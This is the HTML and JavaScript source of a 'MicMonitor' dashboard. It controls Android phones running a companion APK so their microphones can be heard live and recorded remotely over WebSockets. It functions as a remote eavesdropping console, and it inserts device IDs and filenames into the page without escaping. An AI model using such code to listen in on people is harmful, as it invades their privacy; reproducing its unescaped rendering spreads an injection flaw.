<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MicMonitor Dashboard</title>
    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }
      body {
        font-family: "Segoe UI", Arial, sans-serif;
        background: #0f1117;
        color: #e0e0e0;
        min-height: 100vh;
        padding: 24px;
      }
      h1 {
        font-size: 24px;
        color: #64b5f6;
        margin-bottom: 6px;
      }
      .subtitle {
        color: #78909c;
        font-size: 13px;
        margin-bottom: 24px;
      }
      .status-bar {
        display: flex;
        align-items: center;
        gap: 8px;
        background: #1e2330;
        border-radius: 8px;
        padding: 10px 16px;
        margin-bottom: 24px;
        font-size: 13px;
        color: #90a4ae;
      }
      .dot {
        width: 10px;
        height: 10px;
        border-radius: 50%;
        background: #ef5350;
      }
      .dot.connected {
        background: #66bb6a;
      }

      /* ── Device cards ──────────────────────────────────────────── */
      #devicesContainer {
        display: flex;
        flex-wrap: wrap;
        gap: 16px;
      }
      .device-card {
        background: #1e2330;
        border: 1px solid #2c3344;
        border-radius: 12px;
        padding: 20px;
        min-width: 320px;
        flex: 1;
      }
      .device-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 14px;
      }
      .device-name {
        font-size: 15px;
        font-weight: bold;
        color: #64b5f6;
      }
      .device-badge {
        background: #263238;
        border-radius: 20px;
        padding: 3px 10px;
        font-size: 11px;
        color: #80cbc4;
      }
      .device-meta {
        font-size: 12px;
        color: #546e7a;
        margin-bottom: 14px;
      }

      /* ── Live audio visualization ───────────────────────────────── */
      canvas {
        width: 100%;
        height: 60px;
        background: #263238;
        border-radius: 8px;
        margin-bottom: 14px;
        display: block;
      }

      /* ── Buttons ─────────────────────────────────────────────── */
      .btn-row {
        display: flex;
        gap: 8px;
        flex-wrap: wrap;
        margin-bottom: 14px;
      }
      button {
        border: none;
        border-radius: 6px;
        cursor: pointer;
        padding: 8px 14px;
        font-size: 13px;
        font-weight: bold;
        transition: opacity 0.15s;
      }
      button:hover {
        opacity: 0.85;
      }
      button:disabled {
        opacity: 0.4;
        cursor: not-allowed;
      }
      .btn-live {
        background: #1976d2;
        color: #fff;
      }
      .btn-rec {
        background: #c62828;
        color: #fff;
      }
      .btn-stop {
        background: #37474f;
        color: #cfd8dc;
      }
      .btn-ping {
        background: #00695c;
        color: #fff;
      }

      /* ── Recording list ─────────────────────────────────────────── */
      .rec-list {
        margin-top: 8px;
      }
      .rec-item {
        display: flex;
        align-items: center;
        justify-content: space-between;
        background: #263238;
        border-radius: 6px;
        padding: 7px 10px;
        margin-bottom: 6px;
        font-size: 12px;
      }
      .rec-item a {
        color: #80cbc4;
        text-decoration: none;
        cursor: pointer;
      }
      .rec-item a:hover {
        text-decoration: underline;
        color: #4fc3f7;
      }
      .rec-size {
        color: #546e7a;
        margin-left: 6px;
      }

      /* ── Log panel ───────────────────────────────────────────── */
      #logPanel {
        background: #1e2330;
        border: 1px solid #2c3344;
        border-radius: 12px;
        padding: 16px;
        margin-top: 24px;
      }
      #logPanel h3 {
        font-size: 14px;
        color: #90a4ae;
        margin-bottom: 10px;
      }
      #logOutput {
        font-family: monospace;
        font-size: 12px;
        color: #b0bec5;
        height: 160px;
        overflow-y: auto;
        line-height: 1.6;
      }
      .log-entry {
        padding: 2px 0;
      }
      .log-ts {
        color: #455a64;
        margin-right: 6px;
      }
      .log-info {
        color: #64b5f6;
      }
      .log-warn {
        color: #ffb74d;
      }
      .log-ok {
        color: #81c784;
      }
      .log-err {
        color: #ef9a9a;
      }

      /* ── No devices placeholder ─────────────────────────── */
      #noDevices {
        color: #455a64;
        font-size: 14px;
        text-align: center;
        padding: 40px;
        width: 100%;
      }
    </style>
  </head>
  <body>
    <h1>🎙️ MicMonitor Dashboard</h1>
    <p class="subtitle">
      Primary device control panel — live listen &amp; record
    </p>

    <div class="status-bar">
      <div id="wsDot" class="dot"></div>
      <span id="wsStatus">Connecting to server…</span>
    </div>

    <div id="devicesContainer">
      <div id="noDevices">
        No devices connected yet.<br />Install the APK on the secondary device
        and grant permission.
      </div>
    </div>

    <div
      id="recordingsPanel"
      style="
        background: #1e2330;
        border-radius: 12px;
        padding: 20px;
        margin-bottom: 24px;
      "
    >
      <h3 style="color: #64b5f6; margin-bottom: 12px; font-size: 15px">
        📂 Recordings
      </h3>
      <div id="globalRecList" style="color: #78909c; font-size: 13px">
        No recordings yet.
      </div>
    </div>

    <div id="logPanel">
      <h3>Event Log</h3>
      <div id="logOutput"></div>
    </div>

    <script>
      // ════════════════════════════════════════════════════════════════════
      // Config — auto-detects ws/wss and host so it works locally AND on Render
      // ════════════════════════════════════════════════════════════════════
      const _wsProto = location.protocol === "https:" ? "wss" : "ws";
      const _wsHost  = location.port ? `${location.hostname}:${location.port}` : location.hostname;
      const WS_CONTROL_URL = `${_wsProto}://${_wsHost}/control`;

      // ════════════════════════════════════════════════════════════════════
      // State
      // ════════════════════════════════════════════════════════════════════
      let controlWs = null;
      const deviceState = {}; // { [deviceId]: { audioCtx, isLive, isRecording, ... } }
      let pendingBinaryDeviceId = null; // which device the next binary message belongs to

      // ════════════════════════════════════════════════════════════════════
      // WebSocket connection to control server
      // ════════════════════════════════════════════════════════════════════
      function connectControlWs() {
        controlWs = new WebSocket(WS_CONTROL_URL);

        controlWs.onopen = () => {
          setWsStatus(true);
          log("Connected to server", "ok");
        };

        controlWs.onclose = () => {
          setWsStatus(false);
          log("Disconnected — reconnecting in 3s…", "warn");
          setTimeout(connectControlWs, 3000);
        };

        controlWs.onerror = (err) => {
          log("WebSocket error", "err");
        };

        controlWs.onmessage = (event) => {
          if (typeof event.data === "string") {
            handleJsonMessage(JSON.parse(event.data));
          } else {
            // Binary = audio chunk, tagged by most recent audio_chunk JSON
            handleAudioBinary(event.data);
          }
        };
      }

      function handleJsonMessage(msg) {
        switch (msg.type) {
          case "device_list":
            msg.devices.forEach((d) => addDeviceCard(d.deviceId, d.model));
            break;
          case "device_connected":
            addDeviceCard(msg.deviceId, msg.model || "…");
            log(`Device connected: ${msg.deviceId}`, "ok");
            break;
          case "device_disconnected":
            removeDeviceCard(msg.deviceId);
            log(`Device disconnected: ${msg.deviceId}`, "warn");
            break;
          case "device_info":
            updateDeviceMeta(msg.deviceId, msg.model, msg.sdk);
            log(`${msg.deviceId} → ${msg.model} (SDK ${msg.sdk})`, "info");
            break;
          case "audio_chunk":
            // Next binary message belongs to this device
            pendingBinaryDeviceId = msg.deviceId;
            break;
          case "recording_started":
            markRecording(msg.deviceId, true, msg.filename);
            log(`⏺ Recording started: ${msg.filename}`, "ok");
            break;
          case "recording_stopped":
            markRecording(msg.deviceId, false, msg.filename);
            log(`⏹ Recording saved: ${msg.filename}`, "ok");
            refreshRecordingsList();
            break;
          case "recording_saved":
            log(`💾 Device saved: ${msg.filename}`, "info");
            refreshRecordingsList();
            break;
          case "ack":
            log(`ACK ${msg.deviceId}: ${msg.message}`, "info");
            break;
          case "error":
            log(`Error: ${msg.message}`, "err");
            break;
        }
      }

      function handleAudioBinary(data) {
        const deviceId = pendingBinaryDeviceId;
        if (!deviceId) return;
        const state = deviceState[deviceId];
        if (!state || !state.isLive) return;

        // Convert ArrayBuffer to Float32 PCM and play
        arrayBufferToFloat32(data, (float32) => {
          playAudioChunk(state, float32);
          drawWaveform(state.canvas, float32);
        });
      }

      // ════════════════════════════════════════════════════════════════════
      // Device card UI
      // ════════════════════════════════════════════════════════════════════
      function addDeviceCard(deviceId, model) {
        if (deviceState[deviceId]) {
          // Already exists — reset recording button state on reconnect
          markRecording(deviceId, false, null);
          return;
        }

        document.getElementById("noDevices").style.display = "none";

        const card = document.createElement("div");
        card.className = "device-card";
        card.id = `card_${deviceId}`;
        card.innerHTML = `
    <div class="device-header">
      <span class="device-name">📱 ${deviceId.substring(0, 8)}…</span>
      <span class="device-badge" id="badge_${deviceId}">CONNECTED</span>
    </div>
    <div class="device-meta" id="meta_${deviceId}">Model: ${model || "Unknown"}</div>
    <canvas id="canvas_${deviceId}" width="600" height="60"></canvas>
    <div class="btn-row">
      <button class="btn-live"  id="btnLive_${deviceId}"  onclick="toggleLive('${deviceId}')">▶ Start Live Listen</button>
      <button class="btn-rec"   id="btnRec_${deviceId}"   onclick="startRecord('${deviceId}')">⏺ Start Record</button>
      <button class="btn-stop"  id="btnStop_${deviceId}"  onclick="stopRecord('${deviceId}')" disabled>⏹ Stop Record</button>
      <button class="btn-ping"  onclick="pingDevice('${deviceId}')">🏓 Ping</button>
    </div>
    <div class="rec-list" id="recList_${deviceId}"></div>
  `;
        document.getElementById("devicesContainer").appendChild(card);

        // Init state
        deviceState[deviceId] = {
          isLive: false,
          isRecording: false,
          audioCtx: null,
          nextPlayTime: 0,
          canvas: document.getElementById(`canvas_${deviceId}`),
        };
      }

      function removeDeviceCard(deviceId) {
        const card = document.getElementById(`card_${deviceId}`);
        if (card) card.remove();
        delete deviceState[deviceId];

        if (Object.keys(deviceState).length === 0) {
          document.getElementById("noDevices").style.display = "block";
        }
      }

      function updateDeviceMeta(deviceId, model, sdk) {
        const el = document.getElementById(`meta_${deviceId}`);
        if (el) el.textContent = `Model: ${model} | Android SDK: ${sdk}`;
      }

      function markRecording(deviceId, active, filename) {
        const state = deviceState[deviceId];
        if (!state) return;
        state.isRecording = active;
        const btnRec = document.getElementById(`btnRec_${deviceId}`);
        const btnStop = document.getElementById(`btnStop_${deviceId}`);
        if (btnRec) btnRec.disabled = active;
        if (btnStop) btnStop.disabled = !active;
        const badge = document.getElementById(`badge_${deviceId}`);
        if (badge) badge.textContent = active ? "⏺ RECORDING" : "CONNECTED";

        // Show a download link on the card when recording finishes
        if (!active && filename) {
          const recList = document.getElementById(`recList_${deviceId}`);
          if (recList) {
            const entry = document.createElement("div");
            entry.className = "rec-item";
            entry.innerHTML = `
              <a href="/recordings/${filename}" download="${filename}"
                 title="Download ${filename}"
                 style="color:#80cbc4;text-decoration:none;cursor:pointer;font-size:12px;word-break:break-all">
                ⬇ ${filename}
              </a>`;
            recList.prepend(entry);
          }
        }
      }

      // ════════════════════════════════════════════════════════════════════
      // Control actions
      // ════════════════════════════════════════════════════════════════════
      function sendCmd(deviceId, cmd) {
        if (controlWs && controlWs.readyState === WebSocket.OPEN) {
          controlWs.send(JSON.stringify({ cmd, deviceId }));
        }
      }

      function toggleLive(deviceId) {
        const state = deviceState[deviceId];
        if (!state) return;
        const btn = document.getElementById(`btnLive_${deviceId}`);

        if (state.isLive) {
          // Stop live
          state.isLive = false;
          if (state.audioCtx) {
            state.audioCtx.close();
            state.audioCtx = null;
          }
          btn.textContent = "▶ Start Live Listen";
          btn.style.background = "#1976d2";
          clearCanvas(state.canvas);
          log(`Stopped live listen for ${deviceId}`, "info");
        } else {
          // Start live
          state.isLive = true;
          state.audioCtx = new (
            window.AudioContext || window.webkitAudioContext
          )({ sampleRate: 16000 });
          state.nextPlayTime = state.audioCtx.currentTime;
          btn.textContent = "⏸ Stop Live Listen";
          btn.style.background = "#0d47a1";
          log(`Started live listen for ${deviceId}`, "ok");
        }
      }

      function startRecord(deviceId) {
        sendCmd(deviceId, "start_record");
      }

      function stopRecord(deviceId) {
        sendCmd(deviceId, "stop_record");
      }

      function pingDevice(deviceId) {
        sendCmd(deviceId, "ping");
        log(`Pinged ${deviceId}`, "info");
      }

      // ════════════════════════════════════════════════════════════════════
      // Audio playback — raw PCM 16-bit mono 16 kHz
      // ════════════════════════════════════════════════════════════════════
      function arrayBufferToFloat32(data, callback) {
        const reader = new FileReader();
        reader.onload = (e) => {
          const arrayBuf = e.target.result;
          const int16 = new Int16Array(arrayBuf);
          const float32 = new Float32Array(int16.length);
          for (let i = 0; i < int16.length; i++) {
            float32[i] = int16[i] / 32768.0;
          }
          callback(float32);
        };
        reader.readAsArrayBuffer(
          data instanceof Blob ? data : new Blob([data]),
        );
      }

      function playAudioChunk(state, float32) {
        if (!state.audioCtx || float32.length === 0) return;
        try {
          const buffer = state.audioCtx.createBuffer(1, float32.length, 16000);
          buffer.copyToChannel(float32, 0);
          const source = state.audioCtx.createBufferSource();
          source.buffer = buffer;
          source.connect(state.audioCtx.destination);

          // Schedule gapless playback
          const now = state.audioCtx.currentTime;
          if (state.nextPlayTime < now) state.nextPlayTime = now + 0.05;
          source.start(state.nextPlayTime);
          state.nextPlayTime += buffer.duration;
        } catch (e) {
          // Audio context may be suspended after user leaves tab — auto-resume
          if (state.audioCtx && state.audioCtx.state === "suspended") {
            state.audioCtx.resume();
          }
        }
      }

      // ════════════════════════════════════════════════════════════════════
      // Waveform canvas
      // ════════════════════════════════════════════════════════════════════
      function drawWaveform(canvas, float32) {
        if (!canvas) return;
        const ctx = canvas.getContext("2d");
        const W = canvas.width;
        const H = canvas.height;
        const mid = H / 2;
        ctx.clearRect(0, 0, W, H);
        ctx.fillStyle = "#263238";
        ctx.fillRect(0, 0, W, H);
        ctx.beginPath();
        ctx.strokeStyle = "#4fc3f7";
        ctx.lineWidth = 1.5;
        const step = Math.ceil(float32.length / W);
        for (let x = 0; x < W; x++) {
          const sample = float32[x * step] || 0;
          const y = mid + sample * mid * 0.9;
          x === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
        }
        ctx.stroke();
      }

      function clearCanvas(canvas) {
        if (!canvas) return;
        const ctx = canvas.getContext("2d");
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#263238";
        ctx.fillRect(0, 0, canvas.width, canvas.height);
      }

      // ════════════════════════════════════════════════════════════════════
      // Recordings list
      // ════════════════════════════════════════════════════════════════════
      function refreshRecordingsList() {
        fetch("/api/recordings")
          .then((r) => r.json())
          .then((files) => {
            const el = document.getElementById("globalRecList");
            if (!files || files.length === 0) {
              el.innerHTML =
                "<span style='color:#455a64'>No recordings yet.</span>";
              return;
            }
            // Sort newest first
            files.sort((a, b) => b.name.localeCompare(a.name));
            el.innerHTML = files
              .map(
                (f) =>
                  `<div style="display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid #263238">
                <a href="/recordings/${f.name}" download="${f.name}"
                   style="color:#4fc3f7;text-decoration:none;font-size:13px">⬇ ${f.name}</a>
                <span style="color:#546e7a;font-size:12px;margin-left:16px">${formatSize(f.size)}</span>
              </div>`,
              )
              .join("");
          })
          .catch(() => {});
      }

      function formatSize(bytes) {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + " KB";
        return (bytes / (1024 * 1024)).toFixed(1) + " MB";
      }

      // ════════════════════════════════════════════════════════════════════
      // Status bar & log
      // ════════════════════════════════════════════════════════════════════
      function setWsStatus(connected) {
        document.getElementById("wsDot").className =
          "dot" + (connected ? " connected" : "");
        document.getElementById("wsStatus").textContent = connected
          ? "Connected to server ✓"
          : "Disconnected from server";
      }

      function log(message, level = "info") {
        const out = document.getElementById("logOutput");
        const ts = new Date().toLocaleTimeString();
        const entry = document.createElement("div");
        entry.className = "log-entry";
        entry.innerHTML = `<span class="log-ts">[${ts}]</span><span class="log-${level}">${message}</span>`;
        out.insertBefore(entry, out.firstChild);
        // Keep log at 200 entries max
        while (out.children.length > 200) out.removeChild(out.lastChild);
      }

      // ════════════════════════════════════════════════════════════════════
      // Init
      // ════════════════════════════════════════════════════════════════════
      connectControlWs();
      refreshRecordingsList();
      setInterval(refreshRecordingsList, 10000); // refresh every 10s
    </script>
  </body>
</html>
